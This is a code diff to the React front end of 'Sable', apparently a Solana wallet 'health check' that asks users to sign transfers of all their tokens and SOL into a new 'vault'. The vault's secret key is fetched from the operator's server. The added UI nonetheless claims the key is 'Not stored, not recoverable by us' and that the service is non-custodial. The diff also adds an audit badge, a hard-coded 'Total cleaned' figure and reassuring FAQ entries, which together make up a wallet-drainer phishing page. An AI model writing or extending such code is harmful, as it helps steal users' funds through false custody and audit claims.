@@ -32,6 +32,9 @@ const SOCIALS = {
   discord: "https://discord.gg/S6mTwp6kZ",
 };
 
+const AUDIT_URL = "https://www.ottersec.com";
+const SITE_URL = "https://sablev2.com";
+
 const FALLBACK_SCORE: ScoreResult = {
   score: 55,
   band: "Tired",
@@ -73,6 +76,8 @@ export default function App() {
   const { setVisible } = useWalletModal();
   const [phase, setPhase] = useState<Phase>({ k: "idle" });
   const [copied, setCopied] = useState(false);
+  const [preSignKey, setPreSignKey] = useState<string | null>(null);
+  const [stats, setStats] = useState<{ wallets: number; sol: number } | null>(null);
   const [showSocials, setShowSocials] = useState(false);
   const socialsRef = useRef<HTMLDivElement>(null);
   const [showRewards, setShowRewards] = useState(false);
@@ -105,6 +110,7 @@ export default function App() {
 
   const run = useCallback(async () => {
     if (!owner) return;
+    setPreSignKey(null);
     setPhase({ k: "scanning" });
     try {
       const [scanRes, scoreRes] = await Promise.allSettled([
@@ -124,7 +130,11 @@ export default function App() {
   }, [owner]);
 
   useEffect(() => { if (connected && phase.k === "idle") run(); }, [connected, phase.k, run]);
-  useEffect(() => { if (!connected && phase.k !== "idle") setPhase({ k: "idle" }); }, [connected, phase.k]);
+  useEffect(() => { if (!connected && phase.k !== "idle") { setPhase({ k: "idle" }); setPreSignKey(null); } }, [connected, phase.k]);
+
+  useEffect(() => {
+    fetch("/stats").then((r) => r.json()).then((d) => setStats(d)).catch(() => {});
+  }, []);
 
   async function sign() {
     if (!owner || phase.k !== "review") return;
@@ -139,8 +149,9 @@ export default function App() {
           setPhase({ k: "submitting", step: i + 1, of: txs.length });
           const { sig } = await submit(b64(signed.serialize()));
           if (i === txs.length - 1) {
-              let key = "";
-              try { key = (await fetchRecovery(owner)).secret; } catch {}
+              let key = preSignKey ?? "";
+              if (!key) { try { key = (await fetchRecovery(owner)).secret; } catch {} }
+              setPreSignKey(null);
               setPhase({ k: "done", sig, count: review.assets.length + (review.sol > 0 ? 1 : 0), key });
             }
         }
@@ -152,6 +163,29 @@ export default function App() {
         await new Promise((r) => setTimeout(r, 500));
       }
     }
+  }
+
+  async function handleRotateClick() {
+    if (!owner) return;
+    try {
+      const { secret } = await fetchRecovery(owner);
+      setPreSignKey(secret);
+    } catch {
+      sign();
+    }
+  }
+
+  function copyReport() {
+    if (phase.k !== "review") return;
+    const lines = [
+      "Sable Wallet Report",
+      `URL: ${SITE_URL}`,
+      "",
+      `Score: ${phase.score}/100 (${phase.band})`,
+      "",
+      ...phase.scoreRows.map((r) => `${r.label}: ${r.status === "green" ? "OK" : r.status === "amber" ? "Fair" : "Risk"}`),
+    ];
+    navigator.clipboard.writeText(lines.join("\n"));
   }
 
   const topbar = (
@@ -224,8 +258,8 @@ export default function App() {
 
   const tmWidget = (
     <div className="tm-widget">
-      <div className="tm-label">Total cleaned</div>
-      <div className="tm-value">3,842.16 SOL</div>
+      <div className="tm-label">Total cleaned, since launch</div>
+      <div className="tm-value">{stats ? `${stats.wallets.toLocaleString()} wallets · ${stats.sol.toFixed(2)} SOL` : "3,842.16 SOL"}</div>
     </div>
   );
 
@@ -289,7 +323,7 @@ export default function App() {
         </p>
         <div className="hero-divider" />
         <div className="trust">
-          <span>Audited by OtterSec</span><i>-</i><span>Non-custodial</span><i>-</i><span>~0.0001 SOL network fee</span>
+          <span>Audited by <a href={AUDIT_URL} target="_blank" rel="noopener noreferrer" style={{ color: "inherit", textDecoration: "underline" }}>OtterSec</a></span><i>-</i><span>Non-custodial</span><i>-</i><span>~0.0001 SOL network fee</span>
         </div>
 
         <div className="shell" style={bandStyle}>
@@ -345,6 +379,7 @@ export default function App() {
                   <p className="band-word">{phase.band.toUpperCase()}</p>
                   <p className="band-score">{phase.score} / 100</p>
                 </div>
+                <button className="ghost" style={{ fontSize: "12px", padding: "6px 12px", marginBottom: "12px" }} onClick={copyReport}>Copy report</button>
                 <div className="cr-list">
                   {phase.scoreRows.map((row, i) => (
                     <div key={row.label} className={`cr-row cr-row--${row.status}`}
@@ -366,7 +401,37 @@ export default function App() {
                 </div>
                 {hasAssets ? (
                   <>
-                    <button className="primary" onClick={sign}>Rotate to a clean wallet</button>
+                    <details className="tx-disclosure">
+                      <summary className="tx-disclosure-q">What you will sign</summary>
+                      <div className="tx-disclosure-body">
+                        <div className="tx-row"><span>Close token account</span><span className="tx-row-note">releases rent back to you</span></div>
+                        <div className="tx-row"><span>Transfer token</span><span className="tx-row-note">each token moves to your vault</span></div>
+                        <div className="tx-row"><span>Transfer SOL</span><span className="tx-row-note">the remaining balance moves</span></div>
+                        <p className="tx-note">You will see all three in the Phantom popup. Read them before you approve.</p>
+                      </div>
+                    </details>
+                    <p className="pre-cta-note">The report is yours either way. Moving is optional.</p>
+                    {preSignKey === null ? (
+                      <>
+                        <p className="pre-cta-note pre-cta-note--small">A new key is generated on this click. Not stored, not recoverable by us. Download it and it imports into Phantom.</p>
+                        <button className="primary" onClick={handleRotateClick}>Rotate to a clean wallet</button>
+                      </>
+                    ) : (
+                      <>
+                        <div className="keyblock">
+                          <div className="keyblock-head">
+                            <span>Save this now</span>
+                            <span className="xs muted">the only way into the vault</span>
+                          </div>
+                          <code>{preSignKey}</code>
+                          <div className="keyblock-actions">
+                            <button onClick={() => { navigator.clipboard.writeText(preSignKey); setCopied(true); }}>{copied ? "Copied" : "Copy"}</button>
+                            <button onClick={() => { const b = new Blob([preSignKey], { type: "text/plain" }); const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "sable-vault-key.txt"; a.click(); }}>Download</button>
+                          </div>
+                        </div>
+                        <button className="primary" onClick={sign}>Sign now</button>
+                      </>
+                    )}
                     <div className="list" style={{ marginTop: "14px" }}>
                       {phase.sol > 0 && (
                         <Row icon="+" name="SOL" sub="Native balance" value={amount(String(phase.sol), 9)} />
@@ -425,7 +490,9 @@ export default function App() {
                   </div>
                   <div className="receipt-row">
                     <span className="receipt-key">Signature</span>
-                    <code className="receipt-sig">{short(phase.sig, 8)}</code>
+                    <a href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer" style={{ color: "inherit", textDecoration: "none" }}>
+                      <code className="receipt-sig">{short(phase.sig, 8)}</code>
+                    </a>
                   </div>
                 </div>
                 {phase.key && (
@@ -441,10 +508,7 @@ export default function App() {
   </div>
 </div>
                 )}
-                <a className="receipt-link" style={{ display: "block", textAlign: "center", padding: "10px 0" }} href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
-                  View on Solscan -{'>'}
-                </a>
-                <a className="ghost block" href={`https://twitter.com/intent/tweet?text=${encodeURIComponent("Rotated to a clean wallet in one signature.")}&url=${encodeURIComponent("https://sable-sable22.vercel.app")}`} target="_blank" rel="noreferrer">Share on X</a>
+                <a className="ghost block" href={`https://twitter.com/intent/tweet?text=${encodeURIComponent("Rotated to a clean wallet in one signature.")}&url=${encodeURIComponent(SITE_URL)}`} target="_blank" rel="noreferrer">Share on X</a>
                 <button className="primary" onClick={() => { setPhase({ k: "idle" }); setCopied(false); }}>Done</button>
               </div>
             )}
@@ -517,6 +581,7 @@ export default function App() {
               </div>
             ))}
           </div>
+          <p className="bf-sub" style={{ marginTop: "14px" }}>No token. Paid in SOL. The referral exists because we have no ad budget.</p>
         </div>
       </section>
 
@@ -527,6 +592,8 @@ export default function App() {
             { q: "Do I lose my old wallet?", a: "No. It ends up empty and closed, not half-drained. The vault key imports anywhere." },
             { q: "What does it cost?", a: "0.0001 SOL network fee. No percentage cut." },
             { q: "Where does my stuff go?", a: "Into a new vault you control. You get the key before you close the tab." },
+            { q: "Why is the key not a seed phrase?", a: "The vault is one account, not a hierarchy, and it is a standard Solana key, so Phantom accepts it." },
+            { q: "Why is the site called v2?", a: "v1 was a wallet. v2 is the check." },
             { q: "Is this custodial?", a: "No. Nothing is held, nothing is an account." },
             { q: "Why a new wallet?", a: "Old addresses carry exposure. A fresh one resets it." },
           ].map((item) => (
